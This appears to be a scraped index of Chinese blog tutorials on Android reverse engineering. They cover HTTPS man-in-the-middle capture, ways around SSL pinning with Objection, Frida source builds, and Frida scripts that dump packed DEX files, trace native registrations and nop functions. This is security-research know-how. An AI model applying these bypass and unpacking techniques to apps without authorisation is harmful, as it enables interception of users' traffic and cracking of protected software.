浏览器发起Https请求. 服务端返回Https证书. 客户端验证证书是否合法,如果不合法则提示警告. 数据传输阶段 当证书验证合法后,在本地生成随机数. 通过公钥加密随机数,并把加密后的随机数传输到服务端. 服务端通过私钥对随机数进行解密. 服务端通过客户端传输的随机数构造对称加密算法,对返回结果内容进行加密后传输. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:7:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"中间人抓包 中间人攻击,实际上是指客户端在传输数据到服务端的中间过程中,被在链路上的一个设备进行抓取过滤甚至篡改,将完整的客户端-服务端通信在客户端和服务器无感的状态下分割成客户端-攻击者和攻击者-服务端两个通信阶段. 我们在Https上的应用层抓包原理也是基于中间人攻击的方式.Https上的应用层抓包原理主要\"攻破\"的是Https传输过程中验证身份的步骤,我们在配置抓包环境时是将Charles证书加入到系统本身信任的证书中,当应用进行通信时,如果没有进一步的安全保护措施,那么客户端接收到的服务器证书即使是Charles证书也会继续通信,整个过程如下: ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:8:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"对抗手段 为了应对这一通过手动给系统安装证书从而导致中间人攻击继续生效的风险,App也对该类攻击推出了对抗手段,主要有以下两种方式: SSL Pinning 原理 也称为证书绑定,该种方式不仅校验服务器证书是否是系统中的可信凭证,在通信过程中甚至连系统内置的证书都不信任而只信任App指定的证书.一旦发现服务器证书为非指定证书即停止通信,最终导致即使将Charles证书安装到系统信任凭据中也无法生效. 绕过方式 客户端在校验服务器的情况时,考虑到对证书验证的代码是写在App内部,自然而然就可以通过Hook修改校验服务器的代码,从而使得判断的机制失效. 前人的研究工作如下: 可以利用Objection命令完成Bypass. android sslpinning disable Github开源项目-DroidSSLUnpinning. https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js DroidSSLUnpinning.7z 由于SSL Pinning的功能是开发者自定义的,因此并不存在一个通用的解决方案,Objection和DroidSSLUnpinning也只是对常见的App所使用的网络框架中对证书进行校验的代码逻辑进行了Hook修改,一旦App中的代码被混淆或使用了未知的框架,这些App的客户端校验服务器的逻辑就需要安全人员自行分析. 服务器校验客户端 原理 这种方式发生在Https验证身份阶段,服务器在接受到客户端的公钥后,在发送session key之前先对客户端的公钥进行验证,如果不是信任的证书公钥,服务器就中止和客户端的通信. 绕过方式 服务器并不掌握在分析人员手中,因此在中间人的状态下与服务器进行通信的实际上已经变成抓包软件,比如Charles.通常来说,我们所能做的对抗手段就是将App中内置的证书导入Charles中,使得服务端认为自己仍旧是在与其信任的客户端进行通信,最终达到欺骗服务器的目的. 具体的操作需要完成两项工作: 分析Apk,找到证书文件和相应的证书密码. 在找到证书和密码后将其导入到抓包软件中,比如导入Charles.打开Charles,依次单击Proxy-\u003eSSL Proxy Settings-\u003eClient Certificates-\u003eAdd 添加新证书,然后输入指定的域名IP以及端口并导入p12或者pem格式的证书,之后即可将Charles伪装成使用特定证书的客户端,最终达到正常抓包的目的. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:8:1","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Hook模拟抓包 这种方式的抓包虽然不如抓包软件抓到的数据包全面,但是如果能够顺利Hook到发包函数,就可以直接无视证书,甚至通过Hook直接得到参数并在Hook的函数中通过打印函数调用栈得到函数的调用链,为后续分析带来便利. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:9:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Objection 这里来展示下如何利用Objection快速定位App中的收发包函数. 示例Apk moveTV.apk 步骤展示 切换到Objection的目录,删除旧的日志. cd ~/.objection rm * 启动App,使用Objection附加到App进程. objection.exe -g com.cz.babySister explore 运行下述命令,获取App已经加载的所有类. android hooking list classes 输入exit命令,退出Objection,到Objection目录重命名日志文件(objection.log),防止后续操作影响本次生成的日志文件,这里重命名为objection1.log 使用网络框架相关的关键词来过滤相关类. cat .\\objection1.log |grep -i HttpURLConnection cat .\\objection1.log |grep -i okhttp3 cat .\\objection1.log |grep -i okhttp ... //看上述哪个过滤的数量比较多,就重定向到文件中,如: cat .\\objection1.log |grep -i okhttp \u003e1.txt 通过一些文件编辑器快速输入多行相同的数据来补全每一行中类的Objection命令.这里使用notepad++通过Shift+Alt对每一行首进行全选,并输入以下命令. android hooking watch class 切割上述文件中的命令为多个文件,防止Objection一次性Hook太多类崩溃. 重新使用Objection附加到App上,并使用-c执行文件中的命令. objection.exe -g com.cz.babySister explore -c \".\\1.txt\" 在手机上对App进行操作(这里主要是点击App中的登录按钮,抓通信数据.),如果Objection界面中没有任何函数被调到,就应该回到第8步,更换包含Hook命令的文本文件.如果在Objection界面看到一堆函数被调用,说明框架类型确认成功. 任意选择上图中被调用的函数,比如说选择com.android.okhttp.internal.http.RealResponseBody.source()这个函数.此时退出Objection,重新附加上App,使用下述命令进行单一Hook. android hooking watch class_method com.android.okhttp.internal.http.RealResponseBo dy.source --dump-args --dump-backtrace --dump-return 此时去点击App中的登录按钮,查看Objection界面. 这样就找到了发包函数com.cz.babySister.c.a.a Hook上述函数进行验证. android hooking watch class_method com.cz.babySister.c.a.a --dump-args --dump-back trace --dump-return 这里我们输入的账号和密码分别是123和qwertyuiop 缺点 上述过程过于依赖利用网络通信框架的关键词进行过滤,假如要分析的App本身存在强度非常大的混淆,将App中一些用来快速定位网络框架的关键字混淆成了无意义的字符,那么Hook抓包定位的方式就失效了. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:9:1","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"OkHttpLogger 介绍 Github链接: https://github.com/siyujie/OkHttpLogger-Frida OkHttpLogger-Frida.7z 这是一个能够完成混淆后的okhttp Hook的项目,在该项目中,Hook的方法脱离了直接经过字符串匹配的方式,反而通过反射去获取所有类并利用okhttp3框架的一些特征去验证App中是否使用了okhttp3这个网络通信框架. 示例Apk 春水堂.apk 步骤展示 将项目中的okhttpfind.dex放到手机的/data/local/tmp目录下,并为之提升权限. adb push .\\okhttpfind.dex /data/lcoal/tmp adb shell su chmod 777 /data/lcoal/tmp/okhttpfind.dex 启动App,使用下述命令将okhttp_poker.js注进去. //加入-o LuoHun.txt 可以将Frida一次注入后的所有输出保存到文件中,可供后续 frida -U org.sfjboldyvukzzlpp -l .\\okhttp_poker.js -o LuoHun.txt 按照提示输入find()命令,执行寻找okhttp框架的功能. 将找到的结果全部复制并覆盖原okhttp_poker.js脚本中关于okhttp类的一些定义. 执行hold()命令,开启Hook,然后开始操作App,就会发现一堆网络连接的内容. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:9:2","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"参考链接 \u003c安卓Frida逆向与抓包实战\u003e https://www.runoob.com/http/http-messages.html https://segmentfault.com/a/1190000021494676 ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:10:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android Hook"],"content":"Frida源码编译 ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:0:0","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Hook"],"content":"官方教程 https://frida.re/docs/building/#gnulinux 这里我们也使用Ubuntu20.04进行编译. ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:1:0","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Hook"],"content":"开始编译 ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:0","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Hook"],"content":"安装一些辅助工具. //设置root密码 sudo passwd root //更新 apt update //安装net工具,可以使用ifconfig apt install net-tools //文本编辑工具 apt install gedit //代理工具,科学上网 apt install proxychains //设置socks5代理 gedit /etc/proxychains.conf ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:1","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Hook"],"content":"安装官方推荐环境. proxychains apt-get install build-essential curl git lib32stdc++-9-dev \\ libc6-dev-i386 nodejs npm python3-dev python3-pip //编译check-core-linux-x86_64的时候需要 proxychains apt-get install gcc-multilib g++-multilib ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:2","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Hook"],"content":"拉Frida源码. proxychains git clone --recurse-submodules https://github.com/frida/frida cd frida ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:3","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Hook"],"content":"配置toolchain和sdk. 官方toolchain和sdk下载链接如下: 其中20220318是frida中releng/deps.mk中的frida_deps_version,后面部分则是toolchain-{平台+架构}.tar.bz2 https://build.frida.re/deps/20220318/toolchain-linux-x86_64.tar.bz2 https://build.frida.re/deps/20220318/sdk-linux-x86_64.tar.bz2 https://build.frida.re/deps/20220318/sdk-android-arm.tar.bz2 https://build.frida.re/deps/20220318/sdk-android-arm64.tar.bz2 在frida文件夹下面新建build文件夹,使用wget将上述链接文件放进去. 接下来在frida文件夹下,执行下述命令. releng/setup-env.sh ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:4","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Hook"],"content":"配置NDK 在frida文件夹下,执行下述命令,就会报需要的NDK版本. make core-android-arm64 去官网下载NDK. https://developer.android.google.cn/ndk/downloads/ //这里我们下载r24的Linux NDK https://dl.google.com/android/repository/android-ndk-r24-linux.zip 解压上述下载的文件. unzip android-ndk-r24-linux.zip 配置环境变量. gedit ~/.bashrc //将下述内容添加到上述文件的末尾 export ANDROID_NDK_ROOT=/home/luohun/Desktop/android-ndk-r24 export PATH=$ANDROID_NDK_ROOT:$PATH //检查是否配置成功 source ~/.bashrc ndk-build --v ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:5","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Hook"],"content":"编译 在frida目录下执行make,会让你选择编译的平台,这里我们编译arm64平台的. make core-android-arm64 最终产物在 frida/build/frida-android-arm64/bin目录下. ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:6","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Hook"],"content":"参考链接 https://blog.seeflower.dev/archives/16/ ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:3:0","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Hook"],"content":"Frida Hook大全 ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:0:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"Frida脱壳 这里以脱一代整体壳为例. 优点:调试简单,java层的所有功能都能轻易实现. 缺点:native层的部分系统函数是inline函数,没办法hook,也没办法主动调用. ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:1:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"定位脱壳点 我们在Java层主动加载一个类是调用dexClassLoader.loadClass来加载类的.因此可以阅读DexClassLoader类的loadClass源码来寻求答案. //http://androidxref.com/8.1.0_r33/xref/libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.java DexClassLoader -\u003eBaseDexClassLoader -\u003eClassLoader -\u003eloadClass protected Class\u003c?\u003e loadClass(String name, boolean resolve) throws ClassNotFoundException { // First, check if the class has already been loaded Class\u003c?\u003e c = findLoadedClass(name); if (c == null) { try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. c = findClass(name); } } return c; } //如果没找到的话,就调用子类的findClass //http://androidxref.com/8.1.0_r33/xref/libcore/dalvik/src/main/java/dalvik/system/BaseDexClassLoader.java BaseDexClassLoader.findClass -\u003epathList.findClass(name, suppressedExceptions) //http://androidxref.com/8.1.0_r33/xref/libcore/dalvik/src/main/java/dalvik/system/DexPathList.java DexPathList.findClass -\u003eelement.findClass -\u003edexFile.loadClassBinaryName //http://androidxref.com/8.1.0_r33/xref/libcore/dalvik/src/main/java/dalvik/system/DexFile.java DexFile.loadClassBinaryName -\u003edefineClass -\u003edefineClassNative //进入Native层 //http://androidxref.com/8.1.0_r33/xref/art/runtime/native/dalvik_system_DexFile.cc defineClassNative -\u003eclass_linker-\u003eDefineClass -\u003eLoadClass -\u003eLoadClassMembers -\u003eLoadMethod(const DexFile\u0026 dex_file,const ClassDataItemIterator\u0026 it,Handle\u003cmirror::Class\u003e klass,ArtMethod* dst) //Native层凡出现DexFile的地方均可作为脱壳点 ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:1:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"脱壳脚本 这里通过Hook libart.so中的LoadMethod函数来实现脱壳. var map = {}; function main() { var libart = Module.enumerateSymbols(\"libart.so\"); var addr = NULL; for (var n in libart) { if (libart[n].name.indexOf(\"lassLinker10LoadMethodERKNS\") \u003e= 0) { addr = libart[n].address; break; } } Interceptor.attach(addr, { onEnter: function (arg) { var begin = ptr(arg[1]).add(Process.pointerSize).readPointer(); var size = ptr(arg[1]).add(Process.pointerSize * 2).readU32(); if (map[size] == undefined) { map[size] = begin; dump(begin, size) } } }) } function dump(begin, size) { var path = \"/sdcard/\" + size + \".dex\"; var file = new File(path, \"w\"); file.write(ptr(begin).readByteArray(size)); file.flush(); file.close(); console.log(\"dump success \" + size + \".dex\") } setImmediate(main); ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:1:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"示例apk FridaShell.apk ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:1:3","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"追踪静态注册函数地址 ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:2:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"准备一个apk Java层 package com.example.luonative; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.TextView; import com.example.luonative.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luonative' library on application startup. static { System.loadLibrary(\"luonative\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); //方便IDA附加 try { Thread.sleep(10 * 1000); } catch (InterruptedException e) { e.printStackTrace(); } LuoTst(); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); } public native String stringFromJNI(); public native void LuoTst(); } Native层 #include \u003cjni.h\u003e#include \u003cstring\u003e #include \u003candroid/log.h\u003e#include \u003cdlfcn.h\u003e #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, \"Luo\", __VA_ARGS__); #define LOGW(...) __android_log_print(ANDROID_LOG_WARN, \"Luo\", __VA_ARGS__); #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, \"Luo\", __VA_ARGS__); extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luonative_MainActivity_stringFromJNI( JNIEnv *env, jobject thiz) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } extern \"C\" JNIEXPORT void JNICALL Java_com_example_luonative_MainActivity_LuoTst(JNIEnv *env, jobject thiz) { void *handle = dlopen(\"libc.so\", 0); void *addr = dlsym(handle, \"strstr\"); LOGD(\"strstr addr:%p\", addr); } ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:2:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"确定调试点 假设Native层没有实现Java_com_example_luonative_MainActivity_stringFromJNI这个函数,AS会报以下错误. 说明在遍历so中的导出函数时没有找到上述函数,我们通常找导出函数地址是调用dlsym这个函数.接下来我们在Android源码中跟踪下dlsym这个函数. //http://androidxref.com/8.1.0_r33/xref/bionic/libdl/libdl.c dlsym -\u003e__loader_dlsym -\u003estatic const char ANDROID_LIBDL_STRTAB[] = // 0000000000111111 11112222222222333 333333344444444 44555555555566666 6666677777777778 8888888889999999999 // 0123456789012345 67890123456789012 345678901234567 89012345678901234 5678901234567890 1234567890123456789 \"__loader_dlopen\\0__loader_dlclose\\0__loader_dlsym\\0__loader_dlerror\\0__loader_dladdr\\0__loader_android_up\" -\u003e__dlsym //http://androidxref.com/8.1.0_r33/xref/bionic/linker/dlfcn.cpp#__dlsym __dlsym -\u003edlsym_impl -\u003edo_dlsym(void* handle, const char* sym_name, const char* sym_ver, const void* caller_addr, void** symbol) //http://androidxref.com/8.1.0_r33/xref/bionic/linker/linker.cpp 最终我们发现是调用了linker.so中的do_dlsym函数 ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:2:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"确定Hook点 用IDA附加调试上述apk,在linker64.so中的do_dlsym函数下断,一路单步走,看调用栈. //调用栈 do_dlsym dlsym_impl //http://androidxref.com/8.1.0_r33/xref/art/runtime/java_vm_ext.cc FindSymbol //以下函数返回值均为静态注册的函数地址 FindNativeMethod FindCodeForNativeMethod artFindNativeMethod //http://androidxref.com/8.1.0_r33/xref/art/runtime/entrypoints/jni/jni_entrypoints.cc extern \"C\" const void* artFindNativeMethod() { Thread* self = Thread::Current(); #else extern \"C\" const void* artFindNativeMethod(Thread* self) { DCHECK_EQ(self, Thread::Current()); #endif Locks::mutator_lock_-\u003eAssertNotHeld(self); // We come here as Native. ScopedObjectAccess soa(self); ArtMethod* method = self-\u003eGetCurrentMethod(nullptr); DCHECK(method != nullptr); // Lookup symbol address for method, on failure we'll return null with an exception set, // otherwise we return the address of the method we found. void* native_code = soa.Vm()-\u003eFindCodeForNativeMethod(method); if (native_code == nullptr) { self-\u003eAssertPendingException(); return nullptr; } // Register so that future calls don't come here return method-\u003eRegisterNative(native_code, false); } //从这里可以看到静态注册的函数也是调用了RegisterNative这个函数 ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:2:3","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"打印静态注册函数地址 这里以Hook FindCodeForNativeMethod这个函数为例,通过参数ArtMethod*可以拿到注册的函数名,通过返回值可以拿到注册的地址. const STD_STRING_SIZE = 3 * Process.pointerSize; class StdString { constructor() { this.handle = Memory.alloc(STD_STRING_SIZE); } dispose() { const [data, isTiny] = this._getData(); if (!isTiny) { Java.api.$delete(data); } } disposeToString() { const result = this.toString(); this.dispose(); return result; } toString() { const [data] = this._getData(); return data.readUtf8String(); } _getData() { const str = this.handle; const isTiny = (str.readU8() \u0026 1) === 0; const data = isTiny ? str.add(1) : str.add(2 * Process.pointerSize).readPointer(); return [data, isTiny]; } } function prettyMethod(method_id, withSignature) { const result = new StdString(); Java.api['art::ArtMethod::PrettyMethod'](result, method_id, withSignature ? 1 : 0); return result.disposeToString(); } function main() { var addr = Module.findExportByName(\"libart.so\", \"_ZN3art9JavaVMExt23FindCodeForNativeMethodEPNS_9ArtMethodE\"); Interceptor.attach(addr, { onEnter: function (arg) { var methodname = prettyMethod(arg[1], 0); this.name = methodname; }, onLeave: function (res) { console.log(this.name + \":\" + res); } }) } setImmediate(main); ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:2:4","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"追踪动态注册函数地址 动态注册主要使用RegisterNatives这个函数,查看该部分的Android源码即可. http://androidxref.com/8.1.0_r33/xref/art/runtime/jni_internal.cc 相关的Frida Hook代码已有大牛写好. https://github.com/lasting-yang/frida_hook_libart/blob/master/hook_RegisterNatives.js function find_RegisterNatives(params) { var symbols = Module.enumerateSymbolsSync(\"libart.so\"); var addrRegisterNatives = null; for (var i = 0; i \u003c symbols.length; i++) { var symbol = symbols[i]; //_ZN3art3JNI15RegisterNativesEP7_JNIEnvP7_jclassPK15JNINativeMethodi if (symbol.name.indexOf(\"art\") \u003e= 0 \u0026\u0026 symbol.name.indexOf(\"JNI\") \u003e= 0 \u0026\u0026 symbol.name.indexOf(\"RegisterNatives\") \u003e= 0 \u0026\u0026 symbol.name.indexOf(\"CheckJNI\") \u003c 0) { addrRegisterNatives = symbol.address; console.log(\"RegisterNatives is at \", symbol.address, symbol.name); hook_RegisterNatives(addrRegisterNatives) } } } function hook_RegisterNatives(addrRegisterNatives) { if (addrRegisterNatives != null) { Interceptor.attach(addrRegisterNatives, { onEnter: function (args) { console.log(\"[RegisterNatives] method_count:\", args[3]); var env = args[0]; var java_class = args[1]; var class_name = Java.vm.tryGetEnv().getClassName(java_class); //console.log(class_name); var methods_ptr = ptr(args[2]); var method_count = parseInt(args[3]); for (var i = 0; i \u003c method_count; i++) { var name_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * 3)); var sig_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize)); var fnPtr_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize * 2)); var name = Memory.readCString(name_ptr); var sig = Memory.readCString(sig_ptr); var find_module = Process.findModuleByAddress(fnPtr_ptr); console.log(\"[RegisterNatives] java_class:\", class_name, \"name:\", name, \"sig:\", sig, \"fnPtr:\", fnPtr_ptr, \" fnOffset:\", ptr(fnPtr_ptr).sub(find_module.base), \" callee:\", DebugSymbol.fromAddress(this.returnAddress)); } } }); } } setImmediate(find_RegisterNatives); ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:3:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"Nop掉Native函数 ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:4:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"准备一个apk Java层 package com.example.luonative; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.TextView; import com.example.luonative.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luonative' library on application startup. static { System.loadLibrary(\"luonative\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); } public native String stringFromJNI(); } Native层 #include \u003cjni.h\u003e#include \u003cstring\u003e extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luonative_MainActivity_stringFromJNI( JNIEnv *env, jobject thiz) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:4:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"Hook代码 本次示例 Nop掉stringFromJNI函数. function hook_dlopen() { Interceptor.attach(Module.findExportByName(null, \"dlopen\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"dlopen:\", path); } }, onLeave: function (retval) { } }) Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"android_dlopen_ext:\", path); this.path = path; } }, onLeave: function (retval) { if (this.path.indexOf(\"libluonative\") \u003e= 0) { var addr = Module.getExportByName(\"libluonative.so\", \"Java_com_example_luonative_MainActivity_stringFromJNI\") //错误示例 Nop // Interceptor.attach(addr, { // onEnter: function (args) { // return // }, // onLeave: function (retval) { // } // }) //正确示例 Nop Interceptor.replace(addr, new NativeCallback(function () { return 0; }, 'int', [])); } } }); } setImmediate(hook_dlopen); ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:4:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"Frida结合自定义Rom ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:5:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"GetDexFile ArtMethod类中有一个很好用的函数GetDexFile(),但很遗憾它是inline函数,并没有导出.但我们可以编译Android源码,在art_method-inl.h中添加一个导出函数myGetDexFile(),最后在libart.so中可以找到我们导出的函数. http://androidxref.com/8.1.0_r33/xref/art/runtime/art_method.cc http://androidxref.com/8.1.0_r33/xref/art/runtime/art_method-inl.h AndroidStudio新建一个工程,用IDA打开libart.so找到我们导出的函数,将相关代码移植到我们新建的工程中,编译,生成我们自己的so文件(也可以不自己生成so,用Frida直接加载Android源码编译后的libart.so).最后可以用Frida加载我们自己写的so,调用其中的导出函数. 这样的示例,可以参考寒冰大佬的Frida-Fart. 